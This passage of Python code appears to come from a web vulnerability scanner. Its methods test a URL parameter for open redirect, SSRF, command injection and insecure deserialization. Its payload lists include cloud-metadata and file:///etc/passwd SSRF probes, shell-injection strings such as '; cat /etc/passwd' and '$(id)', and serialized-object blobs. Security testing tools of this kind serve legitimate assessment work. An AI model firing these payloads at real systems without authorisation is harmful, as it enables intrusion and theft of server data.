        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {
                executor.submit(self._test_open_redirect, payload, payload_type): (payload, payload_type)
                for payload, payload_type in payloads
            }
            
            for future in concurrent.futures.as_completed(future_to_payload):
                payload, payload_type = future_to_payload[future]
                try:
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                except Exception as e:
                    logger.error(f"Error testing open redirect payload '{payload}': {str(e)}")
        
        logger.info(f"Found {len(vulnerabilities)} potential open redirect vulnerabilities")
        return vulnerabilities
    
    def _test_open_redirect(self, payload: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """
        Test an open redirect payload
        
        Args:
            payload: The open redirect payload to test
            payload_type: The type of open redirect payload
            
        Returns:
            Dict containing vulnerability information if detected, None otherwise
        """
        # Create the test URL
        test_url = replace_param_in_url(self.target_url, self.target_param, payload)
        
        # Send the request with allow_redirects=False to check for redirect
        test_response = self.http_client.get(test_url, allow_redirects=False)
        
        # Check for redirect status codes
        is_redirect = 300 <= test_response["status_code"] < 400
        
        if is_redirect:
            # Check if the redirect location contains the payload domain
            redirect_location = test_response["headers"].get("Location", "")
            
            is_vulnerable = False
            evidence = ""
            
            if "example.com" in redirect_location:
                is_vulnerable = True
                evidence = f"Redirects to payload domain: {redirect_location}"
            elif "javascript:" in redirect_location:
                is_vulnerable = True
                evidence = f"Redirects to JavaScript URI: {redirect_location}"
            elif "data:" in redirect_location:
                is_vulnerable = True
                evidence = f"Redirects to Data URI: {redirect_location}"
            elif "//" in redirect_location and "://" not in redirect_location:
                is_vulnerable = True
                evidence = f"Redirects to protocol-relative URL: {redirect_location}"
            
            if is_vulnerable:
                return {
                    "type": "open_redirect",
                    "subtype": payload_type,
                    "url": test_url,
                    "param": self.target_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": "High",
                    "status_code": test_response["status_code"],
                    "redirect_location": redirect_location
                }
        
        return None
    
    def _detect_ssrf(self) -> List[Dict[str, Any]]:
        """
        Detect Server-Side Request Forgery (SSRF) vulnerabilities
        
        Returns:
            List of detected SSRF vulnerabilities
        """
        logger.info("Testing for SSRF vulnerabilities")
        
        vulnerabilities = []
        
        # SSRF payloads
        payloads = [
            ("http://localhost", "Local SSRF"),
            ("http://127.0.0.1", "Local SSRF"),
            ("http://[::1]", "IPv6 Local SSRF"),
            ("http://0.0.0.0", "Local SSRF"),
            ("http://127.0.0.1:22", "SSH Port SSRF"),
            ("http://127.0.0.1:3306", "MySQL Port SSRF"),
            ("http://127.0.0.1:5432", "PostgreSQL Port SSRF"),
            ("http://127.0.0.1:6379", "Redis Port SSRF"),
            ("http://127.0.0.1:9200", "Elasticsearch Port SSRF"),
            ("http://169.254.169.254/latest/meta-data/", "AWS Metadata SSRF"),
            ("http://metadata.google.internal/", "GCP Metadata SSRF"),
            ("http://169.254.169.254/metadata/v1/", "DigitalOcean Metadata SSRF"),
            ("http://127.0.0.1.nip.io", "DNS Rebinding SSRF"),
            ("http://localhost.nip.io", "DNS Rebinding SSRF"),
            ("file:///etc/passwd", "Local File SSRF"),
            ("dict://localhost:11211/stats", "Dict Protocol SSRF"),
            ("gopher://localhost:11211/stats", "Gopher Protocol SSRF"),
            ("http://0177.0.0.1", "Octal IP SSRF"),
            ("http://0x7f.0.0.1", "Hex IP SSRF"),
            ("http://2130706433", "Decimal IP SSRF")
        ]
        
        # Limit the number of payloads to test
        if len(payloads) > self.max_tests_per_category:
            random.shuffle(payloads)
            payloads = payloads[:self.max_tests_per_category]
        
        # Test each payload
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {
                executor.submit(self._test_ssrf, payload, payload_type): (payload, payload_type)
                for payload, payload_type in payloads
            }
            
            for future in concurrent.futures.as_completed(future_to_payload):
                payload, payload_type = future_to_payload[future]
                try:
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                except Exception as e:
                    logger.error(f"Error testing SSRF payload '{payload}': {str(e)}")
        
        logger.info(f"Found {len(vulnerabilities)} potential SSRF vulnerabilities")
        return vulnerabilities
    
    def _test_ssrf(self, payload: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """
        Test an SSRF payload
        
        Args:
            payload: The SSRF payload to test
            payload_type: The type of SSRF payload
            
        Returns:
            Dict containing vulnerability information if detected, None otherwise
        """
        # Create the test URL
        test_url = replace_param_in_url(self.target_url, self.target_param, payload)
        
        # Send the request
        test_response = self.http_client.get(test_url)
        
        # Check for indicators of successful SSRF
        is_vulnerable = False
        evidence = ""
        
        # Check for localhost/127.0.0.1 specific responses
        if "localhost" in payload or "127.0.0.1" in payload or "[::1]" in payload or "0.0.0.0" in payload:
            # Check for SSH banner
            if "SSH-" in test_response["text"]:
                is_vulnerable = True
                evidence = "SSH server banner detected"
            
            # Check for MySQL banner
            elif "mysql" in test_response["text"].lower() and "password" in test_response["text"].lower():
                is_vulnerable = True
                evidence = "MySQL server response detected"
            
            # Check for Redis banner
            elif "-ERR" in test_response["text"] or "+OK" in test_response["text"]:
                is_vulnerable = True
                evidence = "Redis server response detected"
            
            # Check for common internal service responses
            elif "Internal Server" in test_response["text"] and test_response["status_code"] != 404:
                is_vulnerable = True
                evidence = "Internal server response detected"
        
        # Check for cloud metadata responses
        if "meta-data" in payload or "metadata" in payload:
            # Check for AWS metadata
            if "ami-id" in test_response["text"] or "instance-id" in test_response["text"]:
                is_vulnerable = True
                evidence = "AWS metadata service response detected"
            
            # Check for GCP metadata
            elif "compute.googleapis.com" in test_response["text"]:
                is_vulnerable = True
                evidence = "GCP metadata service response detected"
            
            # Check for DigitalOcean metadata
            elif "digitalocean" in test_response["text"].lower():
                is_vulnerable = True
                evidence = "DigitalOcean metadata service response detected"
        
        # Check for file protocol responses
        if "file:" in payload:
            # Check for /etc/passwd content
            if "root:" in test_response["text"] and ":/bin/bash" in test_response["text"]:
                is_vulnerable = True
                evidence = "Local file content detected"
        
        # Check if the response is significantly different from the base response
        if not is_vulnerable:
            base_response = self.http_client.get(self.target_url)
            similarity = response_similarity(base_response["text"], test_response["text"])
            
            if similarity < 0.5 and test_response["status_code"] == 200:
                is_vulnerable = True
                evidence = f"Response significantly different from base response (similarity: {similarity:.2f})"
        
        if is_vulnerable:
            return {
                "type": "ssrf",
                "subtype": payload_type,
                "url": test_url,
                "param": self.target_param,
                "payload": payload,
                "evidence": evidence,
                "confidence": "High" if "detected" in evidence else "Medium",
                "status_code": test_response["status_code"],
                "response_length": len(test_response["text"])
            }
        
        return None
    
    def _detect_command_injection(self) -> List[Dict[str, Any]]:
        """
        Detect command injection vulnerabilities
        
        Returns:
            List of detected command injection vulnerabilities
        """
        logger.info("Testing for command injection vulnerabilities")
        
        vulnerabilities = []
        
        # Command injection payloads
        payloads = [
            ("; id", "Basic Command Injection"),
            ("| id", "Pipe Command Injection"),
            ("&& id", "AND Command Injection"),
            ("|| id", "OR Command Injection"),
            ("`id`", "Backtick Command Injection"),
            ("$(id)", "Subshell Command Injection"),
            ("; sleep 5", "Time-based Command Injection"),
            ("| sleep 5", "Time-based Pipe Command Injection"),
            ("&& sleep 5", "Time-based AND Command Injection"),
            ("|| sleep 5", "Time-based OR Command Injection"),
            ("; ping -c 5 127.0.0.1", "Ping Command Injection"),
            ("| ping -c 5 127.0.0.1", "Ping Pipe Command Injection"),
            ("; cat /etc/passwd", "File Read Command Injection"),
            ("| cat /etc/passwd", "File Read Pipe Command Injection"),
            ("; echo 'XPLOIT_TEST'", "Echo Command Injection"),
            ("| echo 'XPLOIT_TEST'", "Echo Pipe Command Injection"),
            ("; whoami", "Whoami Command Injection"),
            ("| whoami", "Whoami Pipe Command Injection"),
            ("; uname -a", "Uname Command Injection"),
            ("| uname -a", "Uname Pipe Command Injection")
        ]
        
        # Limit the number of payloads to test
        if len(payloads) > self.max_tests_per_category:
            random.shuffle(payloads)
            payloads = payloads[:self.max_tests_per_category]
        
        # Test each payload
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {
                executor.submit(self._test_command_injection, payload, payload_type): (payload, payload_type)
                for payload, payload_type in payloads
            }
            
            for future in concurrent.futures.as_completed(future_to_payload):
                payload, payload_type = future_to_payload[future]
                try:
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                except Exception as e:
                    logger.error(f"Error testing command injection payload '{payload}': {str(e)}")
        
        logger.info(f"Found {len(vulnerabilities)} potential command injection vulnerabilities")
        return vulnerabilities
    
    def _test_command_injection(self, payload: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """
        Test a command injection payload
        
        Args:
            payload: The command injection payload to test
            payload_type: The type of command injection payload
            
        Returns:
            Dict containing vulnerability information if detected, None otherwise
        """
        # Create the test URL
        test_value = self.base_param_value + payload
        test_url = replace_param_in_url(self.target_url, self.target_param, test_value)
        
        # Send the request
        start_time = time.time()
        test_response = self.http_client.get(test_url)
        response_time = time.time() - start_time
        
        # Check for indicators of successful command injection
        is_vulnerable = False
        evidence = ""
        
        # Check for common command output
        if "uid=" in test_response["text"] and "gid=" in test_response["text"]:
            is_vulnerable = True
            evidence = "Command output (id) detected"
        
        elif "XPLOIT_TEST" in test_response["text"]:
            is_vulnerable = True
            evidence = "Command output (echo) detected"
        
        elif "root:" in test_response["text"] and ":/bin/bash" in test_response["text"]:
            is_vulnerable = True
            evidence = "Command output (cat /etc/passwd) detected"
        
        elif re.search(r'Linux \S+ \d+\.\d+\.\d+-\S+', test_response["text"]):
            is_vulnerable = True
            evidence = "Command output (uname -a) detected"
        
        # Check for time-based injection
        elif "sleep" in payload and response_time > 4.5:  # Threshold for sleep 5
            is_vulnerable = True
            evidence = f"Time-based injection detected. Response time: {response_time:.2f} seconds"
        
        # Check for ping command
        elif "ping" in payload and response_time > 4.5:  # Threshold for ping -c 5
            is_vulnerable = True
            evidence = f"Time-based ping injection detected. Response time: {response_time:.2f} seconds"
        
        if is_vulnerable:
            return {
                "type": "command_injection",
                "subtype": payload_type,
                "url": test_url,
                "param": self.target_param,
                "payload": payload,
                "evidence": evidence,
                "confidence": "High" if "detected" in evidence else "Medium",
                "status_code": test_response["status_code"],
                "response_time": response_time,
                "response_length": len(test_response["text"])
            }
        
        return None
    
    def _detect_insecure_deserialization(self) -> List[Dict[str, Any]]:
        """
        Detect insecure deserialization vulnerabilities
        
        Returns:
            List of detected insecure deserialization vulnerabilities
        """
        logger.info("Testing for insecure deserialization vulnerabilities")
        
        vulnerabilities = []
        
        # Insecure deserialization payloads
        payloads = [
            ("O:8:\"stdClass\":0:{}", "PHP Object Injection"),
            ("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAA", "Java Serialization"),
            ("eyJyY2UiOiJfX2NsYXNzX18iOiJFeGVjIiwgImFyZ3MiOiBbImxzIl19", "Python Pickle Base64"),
            ("KGRwMApTJ3B3bmVkJwpwMQpJMDEKcy4=", "Python Pickle Base64"),
            ("YzAxCmV4ZWMKcDAKKFMnbHMnCnAxCnRwMgpScDMKLg==", "Python Pickle Base64"),
            ("AC ED 00 05 73 72 00 11 6A 61 76 61 2E 6C 61 6E 67 2E 49 6E 74 65 67 65 72", "Java Serialization Hex"),
            ("AAEAAAD/////", "ASP.NET ViewState"),
            ("<serialized>", "XML Serialization"),
            ("<?xml version=\"1.0\"?>", "XML External Entity"),
            ("eyAiJGNsYXNzIiA6ICJjb20uZXhhbXBsZS5FeHBsb2l0IiB9", "JSON Deserialization")
        ]
        
        # Limit the number of payloads to test
        if len(payloads) > self.max_tests_per_category:
            random.shuffle(payloads)
            payloads = payloads[:self.max_tests_per_category]
        
        # Test each payload
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {
                executor.submit(self._test_insecure_deserialization, payload, payload_type): (payload, payload_type)
                for payload, payload_type in payloads
            }
            
            for future in concurrent.futures.as_completed(future_to_payload):
                payload, payload_type = future_to_payload[future]
                try:
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                except Exception as e:
                    logger.error(f"Error testing insecure deserialization payload '{payload}': {str(e)}")
        
        logger.info(f"Found {len(vulnerabilities)} potential insecure deserialization vulnerabilities")
        return vulnerabilities
    
    def _test_insecure_deserialization(self, payload: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """
        Test an insecure deserialization payload
        
        Args:
            payload: The insecure deserialization payload to test
            payload_type: The type of insecure deserialization payload
            
        Returns:
            Dict containing vulnerability information if detected, None otherwise
        """
        # Create the test URL
        test_url = replace_param_in_url(self.target_url, self.target_param, payload)
        
        # Send the request
        test_response = self.http_client.get(test_url)
        
        # Check for indicators of insecure deserialization
        is_vulnerable = False
        evidence = ""
        
        # Check for error messages related to deserialization
        error_patterns = [
            r"unserialize\(\)",
            r"deserialize",
            r"ObjectInputStream",
            r"readObject",
            r"Deserializer",
            r"Marshal.load",
            r"pickle.loads",
            r"yaml.load",
            r"TypeError: object",
            r"ClassNotFoundException",
            r"java.io.InvalidClassException",
            r"cannot be cast to",
            r"readUnshared",
            r"JsonMappingException",
            r"Jackson",
            r"fastjson",
            r"com.fasterxml.jackson"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, test_response["text"], re.IGNORECASE):
                is_vulnerable = True
                match = re.search(pattern, test_response["text"], re.IGNORECASE)
                context_start = max(0, match.start() - 50)
                context_end = min(len(test_response["text"]), match.end() + 50)
                evidence = f"Deserialization error detected: {test_response['text'][context_start:context_end]}"
                break
        
        # Check if the response is significantly different from the base response
        if not is_vulnerable:
            base_response = self.http_client.get(self.target_url)
            similarity = response_similarity(base_response["text"], test_response["text"])
            
            if similarity < 0.5 and test_response["status_code"] >= 500:
                is_vulnerable = True
                evidence = f"Server error with significantly different response (similarity: {similarity:.2f})"
        
        if is_vulnerable:
            return {
                "type": "insecure_deserialization",
                "subtype": payload_type,
                "url": test_url,
                "param": self.target_param,
                "payload": payload,
                "evidence": evidence,
                "confidence": "Medium",
                "status_code": test_response["status_code"],
                "response_length": len(test_response["text"])
            }
        
        return None